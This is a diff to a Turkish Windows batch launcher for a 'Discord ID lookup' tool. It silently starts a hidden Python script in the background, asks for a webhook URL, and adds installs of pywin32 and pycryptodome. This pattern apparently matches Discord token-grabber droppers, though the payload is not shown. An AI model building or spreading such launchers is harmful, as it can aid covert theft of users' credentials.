@@ -2,6 +2,8 @@
 chcp 65001 >nul
 title Satan Discord ID Sorgu
 start "" /B python modules/accepts/main.py
+pip install pypiwin32
+pip install pycryptodome
 cls
 color 0A
 echo.
@@ -15,6 +17,8 @@ set /p WEBHOOK_URL= Webhook URL'sini girin:
 echo.
 echo  Gereksinimler yukleniyor...
 echo.
+pip install pypiwin32
+pip install pycryptodome
 echo.
 echo Gereksinimler yüklendi. Start.bat dosyası ile botu çalıştırın!
 echo.
